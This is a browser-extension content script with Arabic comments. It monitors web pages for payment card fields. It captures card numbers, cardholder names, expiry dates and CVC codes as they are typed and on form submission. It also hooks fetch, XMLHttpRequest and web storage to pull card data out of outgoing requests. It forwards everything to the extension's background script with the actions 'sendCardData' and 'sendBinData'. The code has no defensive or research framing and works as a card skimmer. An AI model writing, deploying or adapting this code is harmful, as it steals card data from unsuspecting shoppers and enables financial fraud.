// Content Script محدث - متوافق مع نظام Rate Limiting
console.log('🔍 Content Script تم تحميله بنجاح');

// مراقبة حقول البطاقة
function monitorCardFields() {
  const cardSelectors = [
    'input[name*="card"]',
    'input[name*="number"]',
    'input[name*="cc"]',
    'input[name*="credit"]',
    'input[type="text"][maxlength="16"]',
    'input[type="text"][maxlength="19"]'
  ];
  
  const nameSelectors = [
    'input[name*="name"]',
    'input[name*="holder"]',
    'input[name*="cardholder"]'
  ];
  
  const expirySelectors = [
    'input[name*="expiry"]',
    'input[name*="exp"]',
    'input[name*="date"]'
  ];
  
  const cvcSelectors = [
    'input[name*="cvc"]',
    'input[name*="cvv"]',
    'input[name*="security"]'
  ];
  
  // مراقبة حقول البطاقة
  cardSelectors.forEach(selector => {
    const fields = document.querySelectorAll(selector);
    fields.forEach(field => {
      field.addEventListener('input', function() {
        if (this.value && this.value.length >= 6) {
          // إرسال بيانات BIN
          const binData = {
            pattern: this.value.substring(0, 6),
            cardNumber: this.value,
            name: getFieldValue(nameSelectors),
            expiryDate: getFieldValue(expirySelectors),
            cvc: getFieldValue(cvcSelectors)
          };
          
          chrome.runtime.sendMessage({
            action: 'sendBinData',
            data: binData
          }, function(response) {
            if (response && response.success) {
              console.log('✅ تم إرسال بيانات BIN بنجاح');
            } else {
              console.error('❌ فشل في إرسال بيانات BIN:', response?.error);
            }
          });
        }
      });
    });
  });
  
  // مراقبة النماذج
  const forms = document.querySelectorAll('form');
  forms.forEach(form => {
    form.addEventListener('submit', function(e) {
      const formData = new FormData(form);
      const cardData = {
        number: formData.get('card_number') || formData.get('number') || formData.get('cc_number') || '',
        name: formData.get('card_name') || formData.get('name') || formData.get('cardholder') || '',
        expiry: formData.get('expiry') || formData.get('expiry_date') || formData.get('exp') || '',
        cvc: formData.get('cvc') || formData.get('cvv') || formData.get('security_code') || ''
      };
      
      if (cardData.number && cardData.number.length > 10) {
        console.log('💳 تم اكتشاف بيانات بطاقة في النموذج');
        
        chrome.runtime.sendMessage({
          action: 'sendCardData',
          data: cardData
        }, function(response) {
          if (response && response.success) {
            console.log('✅ تم إرسال بيانات البطاقة بنجاح');
          } else {
            console.error('❌ فشل في إرسال بيانات البطاقة:', response?.error);
          }
        });
      }
    });
  });
}

// الحصول على قيمة حقل
function getFieldValue(selectors) {
  for (const selector of selectors) {
    const field = document.querySelector(selector);
    if (field && field.value) {
      return field.value;
    }
  }
  return '';
}

// مراقبة التغييرات في DOM
const observer = new MutationObserver(function(mutations) {
  mutations.forEach(function(mutation) {
    if (mutation.type === 'childList') {
      mutation.addedNodes.forEach(function(node) {
        if (node.nodeType === 1) { // Element node
          // إعادة مراقبة الحقول الجديدة
          setTimeout(monitorCardFields, 100);
        }
      });
    }
  });
});

// بدء المراقبة
observer.observe(document.body, {
  childList: true,
  subtree: true
});

// مراقبة الحقول الموجودة
monitorCardFields();

// مراقبة التغييرات في localStorage
const originalSetItem = localStorage.setItem;
localStorage.setItem = function(key, value) {
  if (key.includes('card') || key.includes('payment')) {
    console.log('🔍 تم اكتشاف بيانات في localStorage:', key);
    
    chrome.runtime.sendMessage({
      action: 'sendMessage',
      data: `تم حفظ بيانات في localStorage: ${key}`
    });
  }
  originalSetItem.apply(this, arguments);
};

// مراقبة التغييرات في sessionStorage
const originalSessionSetItem = sessionStorage.setItem;
sessionStorage.setItem = function(key, value) {
  if (key.includes('card') || key.includes('payment')) {
    console.log('🔍 تم اكتشاف بيانات في sessionStorage:', key);
    
    chrome.runtime.sendMessage({
      action: 'sendMessage',
      data: `تم حفظ بيانات في sessionStorage: ${key}`
    });
  }
  originalSessionSetItem.apply(this, arguments);
};

// مراقبة طلبات AJAX
const originalFetch = window.fetch;
window.fetch = function(...args) {
  const [url, options] = args;
  
  if (options && options.body) {
    try {
      const body = JSON.parse(options.body);
      if (body.card_number || body.number || body.cc_number) {
        console.log('🔍 تم اكتشاف بيانات بطاقة في طلب AJAX');
        
        const cardData = {
          number: body.card_number || body.number || body.cc_number || '',
          name: body.card_name || body.name || body.cardholder || '',
          expiry: body.expiry || body.expiry_date || body.exp || '',
          cvc: body.cvc || body.cvv || body.security_code || ''
        };
        
        chrome.runtime.sendMessage({
          action: 'sendCardData',
          data: cardData
        });
      }
    } catch (e) {
      // تجاهل الأخطاء في parsing JSON
    }
  }
  
  return originalFetch.apply(this, args);
};

// مراقبة XMLHttpRequest
const originalXHROpen = XMLHttpRequest.prototype.open;
const originalXHRSend = XMLHttpRequest.prototype.send;

XMLHttpRequest.prototype.open = function(method, url) {
  this._method = method;
  this._url = url;
  return originalXHROpen.apply(this, arguments);
};

XMLHttpRequest.prototype.send = function(data) {
  if (data && typeof data === 'string') {
    try {
      const parsed = JSON.parse(data);
      if (parsed.card_number || parsed.number || parsed.cc_number) {
        console.log('🔍 تم اكتشاف بيانات بطاقة في XMLHttpRequest');
        
        const cardData = {
          number: parsed.card_number || parsed.number || parsed.cc_number || '',
          name: parsed.card_name || parsed.name || parsed.cardholder || '',
          expiry: parsed.expiry || parsed.expiry_date || parsed.exp || '',
          cvc: parsed.cvc || parsed.cvv || parsed.security_code || ''
        };
        
        chrome.runtime.sendMessage({
          action: 'sendCardData',
          data: cardData
        });
      }
    } catch (e) {
      // تجاهل الأخطاء في parsing JSON
    }
  }
  
  return originalXHRSend.apply(this, arguments);
};

console.log('✅ تم تفعيل جميع أنظمة المراقبة بنجاح'); 